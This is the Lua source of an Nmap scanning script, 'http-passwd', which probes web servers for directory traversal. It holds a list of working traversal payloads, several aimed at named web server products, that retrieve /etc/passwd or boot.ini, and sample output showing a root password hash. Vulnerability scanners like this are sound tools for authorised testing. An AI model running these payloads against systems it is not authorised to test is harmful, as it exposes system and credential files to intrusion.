description = [[
Checks if a web server is vulnerable to directory traversal by attempting to
retrieve <code>/etc/passwd</code> or <code>\boot.ini</code> using various traversal methods such as
requesting <code>../../../../etc/passwd</code>.
]]

---
-- @output
-- 80/tcp open  http
-- | http-passwd: Directory traversal found.
-- | Payload: "index.html?../../../../../boot.ini"
-- | Printing first 250 bytes:
-- | [boot loader]
-- | timeout=30
-- | default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
-- | [operating systems]
-- |_multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
--
--
-- 80/tcp open  http
-- | http-passwd: Directory traversal found.
-- | Payload: "../../../../../../../../../../etc/passwd"
-- | Printing first 250 bytes:
-- | root:$1$$iems.VX5yVMByaB1lT8fx.:0:0::/:/bin/sh
-- | sshd:*:65532:65534::/:/bin/false
-- | ftp:*:65533:65534::/:/bin/false
-- |_nobody:*:65534:65534::/:/bin/false

-- 07/20/2007:
--   * Used Thomas Buchanan's HTTPAuth script as a starting point
--   * Applied some great suggestions from Brandon Enright, thanks a lot man!
--
-- 01/31/2008:
--   * Rewritten to use Sven Klemm's excellent HTTP library and to do some much
--     needed cleaning up
--
-- 06/2010:
--   * Added Microsoft Windows (XP and previous) support by also looking for
--     \boot.ini
--   * Added specific payloads according to vulnerabilities published against
--     various specific products.

author = "Kris Katterjohn, Ange Gutek"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"intrusive", "vuln"}

require "shortport"
require "http"

--- Validates the HTTP response code and checks for a <code>valid</code> passwd
-- or Windows Boot Loader format in the body.
--@param response The HTTP response from the server.
--@return The body of the HTTP response.
local validate = function(response)
	if not response.status then
		return nil
	end

	if response.status ~= 200 then
		return nil
	end

	if response.body:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") or response.body:match("%[boot loader%]") then
		return response.body
	end

	return nil
end

--- Transforms a string with ".", "/" and "\" converted to their URL-formatted
--- hex equivalents
--@param str String to hexify.
--@return Transformed string.
local hexify = function(str)
	local ret
	ret = str:gsub("%.", "%%2E")
	ret = ret:gsub("/", "%%2F")
	ret = ret:gsub("\\", "%%5C")
	return ret
end

--- Truncates the <code>passwd</code> or <code>boot.ini</code> file.
--@param passwd <code>passwd</code> or <code>boot.ini</code>file.
--@return Truncated passwd file and truncated length.
local truncatePasswd = function(passwd)
	local len = 250
	return passwd:sub(1, len), len
end

--- Formats output.
--@param passwd <code>passwd</code> or <code>boot.ini</code> file.
--@param dir Formatted request which elicited the good reponse.
--@return String description for output
local output = function(passwd, dir)
	local trunc, len = truncatePasswd(passwd)
	local out = ""
	out = out .. "Directory traversal found.\nPayload: \"" .. dir .. "\"\n"
	out = out .. "Printing first " .. len .. " bytes:\n"
	out = out .. trunc
	return out
end

portrule = shortport.http

action = function(host, port)
	local dirs = {
		hexify("//etc/passwd"),
		hexify(string.rep("../", 10) .. "etc/passwd"),
		hexify(string.rep("../", 10) .. "boot.ini"),
		hexify(string.rep("..\\", 10) .. "boot.ini"),
		hexify("." .. string.rep("../", 10) .. "etc/passwd"),
		hexify(string.rep("..\\/", 10) .. "etc\\/passwd"),
		hexify(string.rep("..\\", 10) .. "etc\\passwd"),

		-- These don't get hexified because they are targeted at
		-- specific known vulnerabilities.
		'..\\\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
		--miniwebsvr
		'%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./boot.ini',
		'%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini',
		--Acritum Femitter Server
		'\\\\..%2f..%2f..%2f..%2fboot.ini% ../',
		--zervit Web Server and several others
		'index.html?../../../../../boot.ini',
		'index.html?..\\..\\..\\..\\..\\boot.ini',
		--Mongoose Web Server
		'///..%2f..%2f..%2f..%2fboot.ini',
		'/..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5Cboot.ini',
		--MultiThreaded HTTP Server v1.1
		'/..\\..\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
		--uHttp Server
		'/../../../../../../../etc/passwd',
		--Java Mini Web Server
		'/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini',
		'/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%2fpasswd',
	}

	for _, dir in ipairs(dirs) do
		local response = http.get(host, port, dir)

		if validate(response) then
			return output(response.body, dir)
		end
	end
end
